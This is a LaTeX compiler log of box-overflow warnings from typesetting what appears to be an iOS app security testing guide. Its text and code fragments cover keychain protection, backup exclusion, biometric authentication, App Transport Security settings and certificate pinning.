eedle/output/keyboard_autocomplete.txt[] 
[639] [640] [641] [642]
Underfull \hbox (badness 10000) in paragraph at lines 36610--36616
[]\TU/SourceSansPro(0)/m/n/10.95 Keychain items for which the \TU/SourceCodePro
(6)/m/n/10.95 kSecAttrAccessibleWhenPasscodeSetThisDeviceOnly

Overfull \hbox (26.82729pt too wide) in paragraph at lines 36651--36658
\TU/SourceSansPro(0)/m/n/10.95 by default, you can [][]exclude files from the b
ackup[][] by calling \TU/SourceCodePro(6)/m/n/10.95 NSURL setResourceValue:forK
ey:error:
[643]
Overfull \hbox (14.51959pt too wide) in paragraph at lines 36692--36692
[]                                  \TU/SourceCodePro(6)/m/n/10.95 forKey: NSUR
LIsExcludedFromBackupKey error: &error];[] 

Overfull \hbox (47.36948pt too wide) in paragraph at lines 36692--36692
[]        \TU/SourceCodePro(6)/m/n/10.95 NSLog(@"Error excluding %@ from backup
 %@", [URL lastPathComponent], error);[] 

Overfull \hbox (23.27939pt too wide) in paragraph at lines 36722--36722
[]\TU/SourceCodePro(6)/m/n/10.95 func excludeFileFromBackup(filePath: URL) -> R
esult<Bool, ExcludeFileError> {[] 
[644]
Overfull \hbox (137.15941pt too wide) in paragraph at lines 36722--36722
[]        \TU/SourceCodePro(6)/m/n/10.95 return .failure(.error("Error excludin
g \(file.lastPathComponent) from backup \(error)"))[] 
[645]
Overfull \hbox (68.13258pt too wide) in paragraph at lines 36845--36847
\TU/SourceSansPro(0)/m/n/10.95 abled](Images/Chapters/0x06d/bither_demo_enable_
pin.PNG” 

Overfull \hbox (60.60991pt too wide) in paragraph at lines 36848--36851
\TU/SourceSansPro(0)/m/n/10.95 src=”Images/Chapters/0x06d/bither_demo_pin_scree
n.PNG){ 
[646]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/72b672220e785bc400e77500d5ace5fe63dd4db6.
png" > [647]
Underfull \hbox (badness 2951) in paragraph at lines 36900--36905
[]\TU/SourceSansPro(0)/m/n/10.95 The free workaround, however, is to find the p
list file in the obfuscated backup generated by

<use  "/tmp/tex2pdf.-b81d3c9506d190f0/56de6a9d5ff0c19a00dc35b70da7bad221861447.
png" > [648]
Overfull \hbox (62.6994pt too wide) in paragraph at lines 36967--36967
[]    \TU/SourceCodePro(6)/m/n/10.95 UIImageView *myBanner = [[UIImageView allo
c] initWithImage:@"overlayImage.png"];[] 

Overfull \hbox (21.08937pt too wide) in paragraph at lines 36982--36983
[]\TU/SourceCodePro(6)/m/n/10.95 /var/mobile/Containers/Data/Application/$APP_I
D/Library/Caches/Snapshots/ 

Overfull \hbox (430.61925pt too wide) in paragraph at lines 36999--36999
[]\TU/SourceCodePro(6)/m/n/10.95 [+]   /private/var/mobile/Containers/Data/Appl
ication/APP_ID/Library/Caches/Snapshots/app_name/B75DD942-76D1-4B86-8466-B79F7A
78B437@2x.png[] 
[649]
Overfull \hbox (502.88927pt too wide) in paragraph at lines 36999--36999
[]\TU/SourceCodePro(6)/m/n/10.95 [+]   /private/var/mobile/Containers/Data/Appl
ication/APP_ID/Library/Caches/Snapshots/app_name/downscaled/12B93BCB-610B-44DA-
A171-AF205BA71269@2x.png[] 
[650]
Overfull \hbox (32.03958pt too wide) in paragraph at lines 37088--37088
[]\TU/SourceCodePro(6)/m/n/10.95 var str1 = "Goodbye"              // "Goodbye"
, base address:            0x0001039e8dd0[] 

Overfull \hbox (27.65958pt too wide) in paragraph at lines 37088--37088
[]\TU/SourceCodePro(6)/m/n/10.95 str1.append(" ")                 // "Goodbye "
, base address:            0x608000064ae0[] 

Overfull \hbox (73.64944pt too wide) in paragraph at lines 37088--37088
[]\TU/SourceCodePro(6)/m/n/10.95 str1.append("cruel world!")      // "Goodbye c
ruel world", base address: 0x6080000338a0[] 

Overfull \hbox (7.94965pt too wide) in paragraph at lines 37088--37088
[]\TU/SourceCodePro(6)/m/n/10.95 str1.removeAll()                 // "", base a
ddress                    0x00010bd66180[] 
[651] [652]
Underfull \hbox (badness 1354) in paragraph at lines 37222--37229
\TU/SourceSansPro(0)/m/n/10.95 (and any other r2frida specific commands) with a
 backslash \TU/SourceCodePro(6)/m/n/10.95 \ \TU/SourceSansPro(0)/m/n/10.95 afte
r starting the session with \TU/SourceCodePro(6)/m/n/10.95 r2
[653]
Underfull \hbox (badness 10000) in paragraph at lines 37297--37300
\TU/SourceSansPro(0)/m/n/10.95 sor - [][]$[][][][][] [] [] [] [][][] [] [][][][
][][][][] [] [][][] [] [][][][] [] [][] [][] [][] [] [][][][][][][][][] [] [][]
 [][] [][] [][] [][][][][] [][] [][][][][][][][][][][][] [][] [][][] [][] [][][
][][][] [][]
[654]
Underfull \hbox (badness 3792) in paragraph at lines 37346--37348
[]\TU/SourceSansPro(0)/m/it/10.95 Symmetric-Key \TU/SourceSansPro(0)/m/n/10.95 
- Message Authentication Codes (HMAC) - Authenticated Encryption - AES-GCM -
[655] [656] [657]
Underfull \hbox (badness 5374) in paragraph at lines 37525--37534
[]\TU/SourceSansPro(0)/m/n/10.95 A lot has been said about deprecated algorithm
s and cryptographic configurations in section
[658]
Overfull \hbox (84.5994pt too wide) in paragraph at lines 37674--37674
[]\TU/SourceCodePro(6)/m/n/10.95 func pbkdf2SHA1(password: String, salt: Data, 
keyByteCount: Int, rounds: Int) -> Data? {[] 

Overfull \hbox (393.38934pt too wide) in paragraph at lines 37674--37674
[]    \TU/SourceCodePro(6)/m/n/10.95 return pbkdf2(hash: CCPBKDFAlgorithm(kCCPR
FHmacAlgSHA1), password: password, salt: salt, keyByteCount: keyByteCount, roun
ds: rounds)[] 

Overfull \hbox (97.73938pt too wide) in paragraph at lines 37674--37674
[]\TU/SourceCodePro(6)/m/n/10.95 func pbkdf2SHA256(password: String, salt: Data
, keyByteCount: Int, rounds: Int) -> Data? {[] 

Overfull \hbox (406.52934pt too wide) in paragraph at lines 37674--37674
[]    \TU/SourceCodePro(6)/m/n/10.95 return pbkdf2(hash: CCPBKDFAlgorithm(kCCPR
FHmacAlgSHA256), password: password, salt: salt, keyByteCount: keyByteCount, ro
unds: rounds)[] 

Overfull \hbox (97.73938pt too wide) in paragraph at lines 37674--37674
[]\TU/SourceCodePro(6)/m/n/10.95 func pbkdf2SHA512(password: String, salt: Data
, keyByteCount: Int, rounds: Int) -> Data? {[] 

Overfull \hbox (406.52934pt too wide) in paragraph at lines 37674--37674
[]    \TU/SourceCodePro(6)/m/n/10.95 return pbkdf2(hash: CCPBKDFAlgorithm(kCCPR
FHmacAlgSHA512), password: password, salt: salt, keyByteCount: keyByteCount, ro
unds: rounds)[] 

Overfull \hbox (211.61938pt too wide) in paragraph at lines 37674--37674
[]\TU/SourceCodePro(6)/m/n/10.95 func pbkdf2(hash: CCPBKDFAlgorithm, password: 
String, salt: Data, keyByteCount: Int, rounds: Int) -> Data? {[] 

Overfull \hbox (67.07942pt too wide) in paragraph at lines 37674--37674
[]    \TU/SourceCodePro(6)/m/n/10.95 let derivationStatus = derivedKeyData.with
UnsafeMutableBytes { derivedKeyBytes in[] 
[659]
Overfull \hbox (202.85939pt too wide) in paragraph at lines 37674--37674
[]    \TU/SourceCodePro(6)/m/n/10.95 let derivedKey = pbkdf2SHA1(password: pass
word, salt: salt, keyByteCount: keyByteCount, rounds: rounds)[] 
[660] [661] [662]
Underfull \hbox (badness 3724) in paragraph at lines 37869--37872
[]\TU/SourceSansPro(0)/m/n/10.95 Apple Developer Documentation on Security - []
[]$[][][][][] [] [] [] [][][][][][][][][] [] [][][][][] [] [][][] [] [][][][][]
[][][][][][][][] []

Overfull \hbox (14.51588pt too wide) in paragraph at lines 37883--37886
[]\TU/SourceSansPro(0)/m/n/10.95 Apple’s Cryptographic Services Guide - [][]$[]
[][][][] [] [] [] [][][][][][][][][] [] [][][][][] [] [][][] [] [][][][][][][] 
[] [][][][][][][] [] [][][][][][][][][][][][][] []

Underfull \hbox (badness 3078) in paragraph at lines 37886--37889
[]\TU/SourceSansPro(0)/m/n/10.95 Apple Developer Documentation on randomization
 SecKey - [][]$[][][][][] [] [] [] [][][][][][][][][][] [] [][][][][] [] [][][]
 []

Underfull \hbox (badness 10000) in paragraph at lines 37892--37895
[]\TU/SourceSansPro(0)/m/n/10.95 Source code of the header file - [][]$[][][][]
[] [] [] [] [][][][][][][][][][] [] [][][][][] [] [][][] [] [][][][][][] [] [][
][][][][][][][][][][] []

Overfull \hbox (0.48085pt too wide) in paragraph at lines 37895--37898
[]\TU/SourceSansPro(0)/m/n/10.95 GCM in CommonCrypto - [][]$[][][][][] [] [] []
 [][][][][][][][][][] [] [][][][][] [] [][][] [] [][][][][][] [] [][][][][][][]
[][][][][] [] [][][][][][][][][][][][] [][]

Underfull \hbox (badness 1803) in paragraph at lines 37898--37901
[]\TU/SourceSansPro(0)/m/n/10.95 Apple Developer Documentation on SecKey - [][]
$[][][][][] [] [] [] [][][][][][][][][][] [] [][][][][] [] [][][] [] [][][][][]
[] [] [][][][][][][][] []
[663]
Underfull \hbox (badness 10000) in paragraph at lines 37923--37926
[]\TU/SourceSansPro(0)/m/n/10.95 Google on Tink - [][]$[][][][][] [] [] [] [][]
[][][][][][] [] [][][][][][][][][][] [] [][][] [] [][][][] [] [][] [] [][][][][
][][][][][][] [][] [][][][] [][] [][][][][][][][][][][][][] [][]

Underfull \hbox (badness 10000) in paragraph at lines 37928--37931
[]\TU/SourceSansPro(0)/m/n/10.95 cartfile - [][]$[][][][][] [] [] [] [][][][][]
[] [] [][][] [] [][][][][][][][] [] [][][][][][][][] [] [][][][] [] [][][][][][
] [] [][][][][][][][][][][][][] [] [][][][][][][][][] [] [][] []

Overfull \hbox (3.03296pt too wide) in paragraph at lines 37941--37944
[]\TU/SourceSansPro(0)/m/n/10.95 Apple Developer Documentation on randomization
 - [][]$[][][][][] [] [] [] [][][][][][][][][] [] [][][][][] [] [][][] [] [][][
][][][][][][][][][][] []

Underfull \hbox (badness 10000) in paragraph at lines 37944--37947
[]\TU/SourceSansPro(0)/m/n/10.95 Apple Developer Documentation on secrandomcopy
bytes - [][]$[][][][][] [] [] [] [][][][][][][][][] [] [][][][][] [] [][][] []

Underfull \hbox (badness 10000) in paragraph at lines 37957--37960
[]\TU/SourceSansPro(0)/m/n/10.95 Apple Developer Documentation: Certificates an
d keys - [][]$[][][][][] [] [] [] [][][][][][][][][] [] [][][][][] [] [][][] []


Underfull \hbox (badness 10000) in paragraph at lines 37960--37963
[]\TU/SourceSansPro(0)/m/n/10.95 Apple Developer Documentation: Generating new 
keys - [][]$[][][][][] [] [] [] [][][][][][][][][] [] [][][][][] [] [][][] []

Overfull \hbox (9.98613pt too wide) in paragraph at lines 37960--37963
[][][][][][][][][][][][][] [] [][][][][][][][] [] [][][][][][][][][][][] [] [][
][] [] [][][] [] [][][][][] [] [][][][][][][][] [] [][][][] [] [][][][][][][][]
[][] [] [][][] [] [][][][][][][][][][][][][] []

Underfull \hbox (badness 3884) in paragraph at lines 37963--37965
[]\TU/SourceSansPro(0)/m/n/10.95 Apple Developer Documentation: Key generation 
attributes - [][]$[][][][][] [] [] [] [][][][][][][][][] [] [][][][][] [] [][][
] []
[664]
Underfull \hbox (badness 4013) in paragraph at lines 38021--38032
[]\TU/SourceCodePro(6)/m/n/10.95 Security.framework \TU/SourceSansPro(0)/m/n/10
.95 is a lower level API to access [][]keychain services[][]. This is a se-

Underfull \hbox (badness 2644) in paragraph at lines 38021--38032
\TU/SourceSansPro(0)/m/n/10.95 cure option if your app needs to protect some se
cret data with biometric authentication,

Underfull \hbox (badness 4518) in paragraph at lines 38021--38032
\TU/SourceSansPro(0)/m/n/10.95 since the access control is managed on a system-
level and can not easily be bypassed.

Overfull \hbox (34.8901pt too wide) in paragraph at lines 38034--38040
[]\TU/SourceSansPro(0)/m/n/10.95 Please be aware that using either the \TU/Sour
ceCodePro(6)/m/n/10.95 LocalAuthentication.framework \TU/SourceSansPro(0)/m/n/1
0.95 or the \TU/SourceCodePro(6)/m/n/10.95 Security.framework\TU/SourceSansPro(
0)/m/n/10.95 ,
[665]
Overfull \hbox (29.56102pt too wide) in paragraph at lines 38054--38060
[]\TU/SourceCodePro(6)/m/n/10.95 deviceOwnerAuthentication\TU/SourceSansPro(0)/
m/n/10.95 (Swift) or \TU/SourceCodePro(6)/m/n/10.95 LAPolicyDeviceOwnerAuthenti
cation\TU/SourceSansPro(0)/m/n/10.95 (Objective-

Overfull \hbox (214.98097pt too wide) in paragraph at lines 38060--38064
[]\TU/SourceCodePro(6)/m/n/10.95 deviceOwnerAuthenticationWithBiometrics \TU/So
urceSansPro(0)/m/n/10.95 (Swift) or \TU/SourceCodePro(6)/m/n/10.95 LAPolicyDevi
ceOwnerAuthenticationWithBiometrics\TU/SourceSansPro(0)/m/n/10.95 (Objective-

Overfull \hbox (51.74937pt too wide) in paragraph at lines 38090--38090
[]\TU/SourceCodePro(6)/m/n/10.95 guard context.canEvaluatePolicy(.deviceOwnerAu
thentication, error: &error) else {[] 

Overfull \hbox (82.40948pt too wide) in paragraph at lines 38090--38090
[]    \TU/SourceCodePro(6)/m/n/10.95 // Could not evaluate policy; look at erro
r and present an appropriate message to user[] 

Overfull \hbox (463.46931pt too wide) in paragraph at lines 38090--38090
[]\TU/SourceCodePro(6)/m/n/10.95 context.evaluatePolicy(.deviceOwnerAuthenticat
ion, localizedReason: "Please, pass authorization to enter this area") { succes
s, evaluationError in[] 

Overfull \hbox (156.86946pt too wide) in paragraph at lines 38090--38090
[]        \TU/SourceCodePro(6)/m/n/10.95 // User did not authenticate successfu
lly, look at evaluationError and take appropriate action[] 
[666]
Overfull \hbox (126.31892pt too wide) in paragraph at lines 38111--38117
\TU/SourceSansPro(0)/m/n/10.95 be accessed only on the current device while the
 passcode is set (\TU/SourceCodePro(6)/m/n/10.95 kSecAttrAccessibleWhenPasscode
SetThisDeviceOnly

Overfull \hbox (206.75691pt too wide) in paragraph at lines 38111--38117
\TU/SourceSansPro(0)/m/n/10.95 parameter) and after Touch ID authentication for
 the currently enrolled fingers only (\TU/SourceCodePro(6)/m/n/10.95 SecAccessC
ontrolCreateFlags.biometryCurrentSet

Overfull \hbox (16.70944pt too wide) in paragraph at lines 38154--38154
[]\TU/SourceCodePro(6)/m/n/10.95 // 1. create AccessControl object that will re
present authentication settings[] 

Overfull \hbox (34.22939pt too wide) in paragraph at lines 38154--38154
[]\TU/SourceCodePro(6)/m/n/10.95 guard let accessControl = SecAccessControlCrea
teWithFlags(kCFAllocatorDefault,[] 

Overfull \hbox (99.9297pt too wide) in paragraph at lines 38154--38154
[]                                                          \TU/SourceCodePro(6
)/m/n/10.95 kSecAttrAccessibleWhenPasscodeSetThisDeviceOnly,[] 

Overfull \hbox (93.3597pt too wide) in paragraph at lines 38154--38154
[]                                                          \TU/SourceCodePro(6
)/m/n/10.95 SecAccessControlCreateFlags.biometryCurrentSet,[] 

Overfull \hbox (378.0594pt too wide) in paragraph at lines 38154--38154
[]\TU/SourceCodePro(6)/m/n/10.95 // 2. define keychain services query. Pay atte
ntion that kSecAttrAccessControl is mutually exclusive with kSecAttrAccessible 
attribute[] 

Overfull \hbox (73.64941pt too wide) in paragraph at lines 38154--38154
[]\TU/SourceCodePro(6)/m/n/10.95 query[kSecValueData as String] = "test_strong_
password".data(using: .utf8)! as CFData[] 
[667]
Overfull \hbox (34.22946pt too wide) in paragraph at lines 38185--38185
[]    \TU/SourceCodePro(6)/m/n/10.95 // 1. create AccessControl object that wil
l represent authentication settings[] 

Overfull \hbox (73.6494pt too wide) in paragraph at lines 38185--38185
[]    \TU/SourceCodePro(6)/m/n/10.95 SecAccessControlRef sacRef = SecAccessCont
rolCreateWithFlags(kCFAllocatorDefault,[] 

Overfull \hbox (395.57942pt too wide) in paragraph at lines 38185--38185
[]    \TU/SourceCodePro(6)/m/n/10.95 // 2. define keychain services query. Pay 
attention that kSecAttrAccessControl is mutually exclusive with kSecAttrAccessi
ble attribute[] 

Overfull \hbox (170.00938pt too wide) in paragraph at lines 38185--38185
[]        \TU/SourceCodePro(6)/m/n/10.95 (__bridge id)kSecValueData: [@"test_st
rong_password" dataUsingEncoding:NSUTF8StringEncoding],[] 
[668]
Overfull \hbox (167.81941pt too wide) in paragraph at lines 38215--38215
[]\TU/SourceCodePro(6)/m/n/10.95 query[kSecUseOperationPrompt as String] = "Ple
ase, pass authorisation to enter this area" as CFString[] 

Overfull \hbox (82.40938pt too wide) in paragraph at lines 38239--38239
[]\TU/SourceCodePro(6)/m/n/10.95 NSDictionary *query = @{(__bridge id)kSecClass
: (__bridge id)kSecClassGenericPassword,[] 

Overfull \hbox (106.49944pt too wide) in paragraph at lines 38239--38239
[]    \TU/SourceCodePro(6)/m/n/10.95 (__bridge id)kSecUseOperationPrompt: @"Ple
ase, pass authorisation to enter this area" };[] 
[669]
Overfull \hbox (78.02939pt too wide) in paragraph at lines 38239--38239
[]\TU/SourceCodePro(6)/m/n/10.95 OSStatus status = SecItemCopyMatching((__bridg
e CFDictionaryRef)query, &queryResult);[] 

Overfull \hbox (152.48938pt too wide) in paragraph at lines 38239--38239
[]    \TU/SourceCodePro(6)/m/n/10.95 NSString* password = [[NSString alloc] ini
tWithData:resultData encoding:NSUTF8StringEncoding];[] 

Overfull \hbox (29.8494pt too wide) in paragraph at lines 38257--38257
[]\TU/SourceCodePro(6)/m/n/10.95 /System/Library/Frameworks/LocalAuthentication
.framework/LocalAuthentication[] 
[670]
Overfull \hbox (110.23622pt too wide) in paragraph at lines 38287--38296
[]\TU/SourceCodePro(6)/m/n/10.95 kSecAccessControlBiometryCurrentSet \TU/Source
SansPro(0)/m/n/10.95 (before iOS 11.3 \TU/SourceCodePro(6)/m/n/10.95 kSecAccess
ControlTouchIDCurrentSet\TU/SourceSansPro(0)/m/n/10.95 ).

Overfull \hbox (18.25624pt too wide) in paragraph at lines 38296--38306
[]\TU/SourceCodePro(6)/m/n/10.95 kSecAccessControlBiometryAny \TU/SourceSansPro
(0)/m/n/10.95 (before iOS 11.3 \TU/SourceCodePro(6)/m/n/10.95 kSecAccessControl
TouchIDAny\TU/SourceSansPro(0)/m/n/10.95 ).

Overfull \hbox (153.38371pt too wide) in paragraph at lines 38315--38321
[]\TU/SourceSansPro(0)/m/n/10.95 In order to make sure that biometrics can be u
sed, verify that the \TU/SourceCodePro(6)/m/n/10.95 kSecAttrAccessibleWhenPassc
odeSetThisDeviceOnly

Underfull \hbox (badness 10000) in paragraph at lines 38315--38321
\TU/SourceSansPro(0)/m/n/10.95 or the \TU/SourceCodePro(6)/m/n/10.95 kSecAttrAc
cessibleWhenPasscodeSet \TU/SourceSansPro(0)/m/n/10.95 protection class is set 
when the

Overfull \hbox (13.90015pt too wide) in paragraph at lines 38315--38321
\TU/SourceCodePro(6)/m/n/10.95 SecAccessControlCreateWithFlags \TU/SourceSansPr
o(0)/m/n/10.95 method is called. Note that the \TU/SourceCodePro(6)/m/n/10.95 .
..ThisDeviceOnly
[671] [672]
Underfull \hbox (badness 1303) in paragraph at lines 38428--38437
[]\TU/SourceSansPro(0)/m/n/10.95 Most modern mobile apps use variants of HTTP-b
ased web services, as these protocols are well-
[673]
Overfull \hbox (63.0455pt too wide) in paragraph at lines 38545--38548
[]\TU/SourceSansPro(0)/m/n/10.95 ATS restrictions can be disabled by configurin
g exceptions in the Info.plist file under the \TU/SourceCodePro(6)/m/n/10.95 NS
AppTransportSecurity
[674]
Overfull \hbox (865.62978pt too wide) in paragraph at lines 38561--38567
\TU/SourceSansPro(0)/m/n/10.95 ture of the \TU/SourceCodePro(6)/m/n/10.95 [NSAp
pTransportSecurity](https://developer.apple.com/library/content/documentation/G
eneral/Reference/InfoPlistKeyReference/Articles/CocoaKeys.html#//apple_ref/doc/
plist/info/NSAppTransportSecurity

Overfull \hbox (16.7095pt too wide) in paragraph at lines 38584--38584
[]            \TU/SourceCodePro(6)/m/n/10.95 NSExceptionRequiresForwardSecrecy 
: Boolean   // Default value is YES[] 

Overfull \hbox (13.08879pt too wide) in paragraph at lines 38605--38606
[]\TU/SourceCodePro(6)/m/n/10.95 NSAllowsArbitraryLoads|  

Overfull \hbox (91.92879pt too wide) in paragraph at lines 38611--38612
[]\TU/SourceCodePro(6)/m/n/10.95 NSAllowsArbitraryLoadsInWebContent|  

Overfull \hbox (19.6588pt too wide) in paragraph at lines 38617--38618
[]\TU/SourceCodePro(6)/m/n/10.95 NSAllowsLocalNetworking|  

Overfull \hbox (65.64879pt too wide) in paragraph at lines 38622--38623
[]\TU/SourceCodePro(6)/m/n/10.95 NSAllowsArbitraryLoadsForMedia|  
[675]
Overfull \hbox (91.92879pt too wide) in paragraph at lines 38651--38652
[]\TU/SourceCodePro(6)/m/n/10.95 NSExceptionAllowsInsecureHTTPLoads|  

Overfull \hbox (52.50879pt too wide) in paragraph at lines 38657--38658
[]\TU/SourceCodePro(6)/m/n/10.95 NSExceptionMinimumTLSVersion|  

Overfull \hbox (85.35878pt too wide) in paragraph at lines 38662--38663
[]\TU/SourceCodePro(6)/m/n/10.95 NSExceptionRequiresForwardSecrecy|  
[676]
Overfull \hbox (161.24939pt too wide) in paragraph at lines 38767--38767
[]\TU/SourceCodePro(6)/m/n/10.95 Configuring ATS Info.plist keys and displaying
 the result of HTTPS loads to https://www.example.com.[] 

Overfull \hbox (36.41942pt too wide) in paragraph at lines 38767--38767
[]\TU/SourceCodePro(6)/m/n/10.95 A test will "PASS" if URLSession:task:didCompl
eteWithError: returns a nil error.[] 

Overfull \hbox (318.92938pt too wide) in paragraph at lines 38767--38767
[]\TU/SourceCodePro(6)/m/n/10.95 Use []--verbose[] to view the ATS dictionaries
 used and to display the error received in URLSession:task:didCompleteWithError
:.[] 

Overfull \hbox (56.12936pt too wide) in paragraph at lines 38767--38767
[]\TU/SourceCodePro(6)/m/n/10.95 ==============================================
==================================[] 

Overfull \hbox (56.12936pt too wide) in paragraph at lines 38767--38767
[]\TU/SourceCodePro(6)/m/n/10.95 ==============================================
==================================[] 

Overfull \hbox (56.12936pt too wide) in paragraph at lines 38767--38767
[]\TU/SourceCodePro(6)/m/n/10.95 ==============================================
==================================[] 
[677]
Overfull \hbox (327.68933pt too wide) in paragraph at lines 38767--38767
[]\TU/SourceCodePro(6)/m/n/10.95 2019-01-15 09:39:27.892 nscurl[11459:5126999] 
NSURLSession/NSURLConnection HTTP load failed (kCFStreamErrorDomainSSL, -9800)[
] 
[678]
Underfull \hbox (badness 4024) in paragraph at lines 38830--38833
[]\TU/SourceSansPro(0)/m/n/10.95 If the application opens third party web sites
 in web views, then from iOS 10 onwards

Underfull \hbox (badness 3209) in paragraph at lines 38830--38833
\TU/SourceCodePro(6)/m/n/10.95 NSAllowsArbitraryLoadsInWebContent \TU/SourceSan
sPro(0)/m/n/10.95 can be used to disable ATS restrictions for
[679]
Overfull \hbox (82.38867pt too wide) in paragraph at lines 38918--38924
\TU/SourceSansPro(0)/m/n/10.95 and \TU/SourceCodePro(6)/m/n/10.95 connection: f
orAuthenticationChallenge\TU/SourceSansPro(0)/m/n/10.95 . Within \TU/SourceCode
Pro(6)/m/n/10.95 connection: forAuthenticationChallenge\TU/SourceSansPro(0)/m/n
/10.95 ,

Overfull \hbox (378.0593pt too wide) in paragraph at lines 38941--38941
[]\TU/SourceCodePro(6)/m/n/10.95 (void)connection:(NSURLConnection *)connection
 willSendRequestForAuthenticationChallenge:(NSURLAuthenticationChallenge *)chal
lenge[] 

Overfull \hbox (42.9894pt too wide) in paragraph at lines 38941--38941
[]  \TU/SourceCodePro(6)/m/n/10.95 SecCertificateRef certificate = SecTrustGetC
ertificateAtIndex(serverTrust, 0);[] 

Overfull \hbox (104.30937pt too wide) in paragraph at lines 38941--38941
[]  \TU/SourceCodePro(6)/m/n/10.95 NSData *remoteCertificateData = CFBridgingRe
lease(SecCertificateCopyData(certificate));[] 

Overfull \hbox (156.86937pt too wide) in paragraph at lines 38941--38941
[]  \TU/SourceCodePro(6)/m/n/10.95 NSString *cerPath = [[NSBundle mainBundle] p
athForResource:@"MyLocalCertificate" ofType:@"cer"];[] 

Overfull \hbox (233.51941pt too wide) in paragraph at lines 38941--38941
[]  \TU/SourceCodePro(6)/m/n/10.95 The control below can verify if the certific
ate received by the server is matching the one pinned in the client.[] 

Overfull \hbox (49.5594pt too wide) in paragraph at lines 38941--38941
[]  \TU/SourceCodePro(6)/m/n/10.95 NSURLCredential *credential = [NSURLCredenti
al credentialForTrust:serverTrust];[] 

Overfull \hbox (78.02939pt too wide) in paragraph at lines 38941--38941
[]  \TU/SourceCodePro(6)/m/n/10.95 [[challenge sender] useCredential:credential
 forAuthenticationChallenge:challenge];[] 
[680]
Overfull \hbox (56.34846pt too wide) in paragraph at lines 38952--38957
[]\TU/SourceSansPro(0)/m/n/10.95 Implement your own pin based on the public key
: Change the comparison \TU/SourceCodePro(6)/m/n/10.95 if ([remoteCertificateDa
ta
[681] [682]
Underfull \hbox (badness 10000) in paragraph at lines 39161--39163
[][][][][][][][] [][] [][][][][] [][] [][][][][][][][][][][][][][][][][][][][][
][] [][] [][][][][][][][][][][][][][][][][][][][][][] [][] [][][] [][] [][][][]
[][][][][] [][] [][][][][][][][] [][] [][][] [][]
[683] [684] [685]
Overfull \hbox (46.84747pt too wide) in paragraph at lines 39334--39339
[]\TU/SourceSansPro(0)/m/n/10.95 App capabilities like \TU/SourceCodePro(6)/m/n
/10.95 bluetooth-peripheral \TU/SourceSansPro(0)/m/n/10.95 or \TU/SourceCodePro
(6)/m/n/10.95 bluetooth-central \TU/SourceSansPro(0)/m/n/10.95 (both \TU/Source
CodePro(6)/m/n/10.95 UIBackgroundModes\TU/SourceSansPro(0)/m/n/10.95 )

Overfull \hbox (164.22061pt too wide) in paragraph at lines 39341--39346
[]\TU/SourceSansPro(0)/m/n/10.95 However, this is not yet enough for the app to
 get access to the Bluetooth peripheral, the \TU/SourceCodePro(6)/m/n/10.95 NSB
luetoothPeripheralUsageDescription
[686]
Overfull \hbox (53.38101pt too wide) in paragraph at lines 39418--39421
[]\TU/SourceSansPro(0)/m/n/10.95 The provisioning profile is embedded into the 
app bundle during the build (\TU/SourceCodePro(6)/m/n/10.95 embedded.mobileprov
ision\TU/SourceSansPro(0)/m/n/10.95 ). 

Underfull \hbox (badness 1655) in paragraph at lines 39425--39432
[]\TU/SourceSansPro(0)/m/n/10.95 For example, if you want to set the “Default D
ata Protection” capability, you would need to go

Overfull \hbox (2.72989pt too wide) in paragraph at lines 39425--39432
\TU/SourceCodePro(6)/m/n/10.95 <appname>.entitlements \TU/SourceSansPro(0)/m/n/
10.95 file as the \TU/SourceCodePro(6)/m/n/10.95 com.apple.developer.default-da
ta-protection
[687]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/cc898defa915d8d7db3adb3f979afac334c445be.
png" >
Underfull \hbox (badness 3000) in paragraph at lines 39487--39494
[]\TU/SourceSansPro(0)/m/n/10.95 If linking on or after iOS 10, developers are 
required to include purpose strings in their app’s

<use  "/tmp/tex2pdf.-b81d3c9506d190f0/eae05828cb9867b6aee454c942147439062e1a64.
png" > [688]
Underfull \hbox (badness 2573) in paragraph at lines 39576--39588
[]\TU/SourceSansPro(0)/m/n/10.95 Apart from simply checking if the permissions 
make sense, further analysis steps might be de-
[689]
Overfull \hbox (30.53203pt too wide) in paragraph at lines 39646--39651
\TU/SourceSansPro(0)/m/it/10.95 bedded provisioning profile \TU/SourceSansPro(0
)/m/n/10.95 that is usually located in the root app bundle folder (\TU/SourceCo
dePro(6)/m/n/10.95 Payload/<appname>.app/\TU/SourceSansPro(0)/m/n/10.95 )
[690]
Overfull \hbox (0.8587pt too wide) in paragraph at lines 39672--39679
\TU/SourceSansPro(0)/m/n/10.95 able to find \TU/SourceCodePro(6)/m/n/10.95 .ent
itlements \TU/SourceSansPro(0)/m/n/10.95 files. This could be also the case for
 the \TU/SourceCodePro(6)/m/n/10.95 embedded.mobileprovision

Overfull \hbox (56.12888pt too wide) in paragraph at lines 39697--39697
[]\TU/SourceCodePro(6)/m/n/10.95 ----------------------------------------------
----------------------------------[] 

Overfull \hbox (145.91937pt too wide) in paragraph at lines 39714--39714
[]\TU/SourceCodePro(6)/m/n/10.95 0x0015d2a4 ascii <?xml version="1.0" encoding=
"UTF-8" standalone="yes"?>\n<!DOCTYPE plist PUBLIC[] 

Overfull \hbox (191.90932pt too wide) in paragraph at lines 39714--39714
[]\TU/SourceCodePro(6)/m/n/10.95 "-//Apple//DTD PLIST 1.0//EN" "http://www.appl
e.com/DTDs/PropertyList-1.0.dtd">\n<plist version="1.0">[] 

Overfull \hbox (42.9894pt too wide) in paragraph at lines 39714--39714
[]\TU/SourceCodePro(6)/m/n/10.95 0x0016427d ascii H<?xml version="1.0" encoding
="UTF-8"?>\n<!DOCTYPE plist PUBLIC[] 

Overfull \hbox (205.04932pt too wide) in paragraph at lines 39714--39714
[]\TU/SourceCodePro(6)/m/n/10.95 "-//Apple//DTD PLIST 1.0//EN" "http://www.appl
e.com/DTDs/PropertyList-1.0.dtd">\n<plist version="1.0">\n[] 
[691]
Overfull \hbox (187.52934pt too wide) in paragraph at lines 39743--39743
[]\TU/SourceCodePro(6)/m/n/10.95 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.
0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">[] 
[692]
Overfull \hbox (0.28447pt too wide) in paragraph at lines 39807--39807
 []        \TU/SourceCodePro(6)/m/n/10.95 // Location services are available, s
o query the user’s location.[] 

Overfull \hbox (150.18265pt too wide) in paragraph at lines 39838--39841
[]\TU/SourceSansPro(0)/m/n/10.95 Consider the list of permissions / capabilitie
s identified in the static analysis (e.g. \TU/SourceCodePro(6)/m/n/10.95 NSLoca
tionWhenInUseUsageDescription\TU/SourceSansPro(0)/m/n/10.95 ). 
[693]
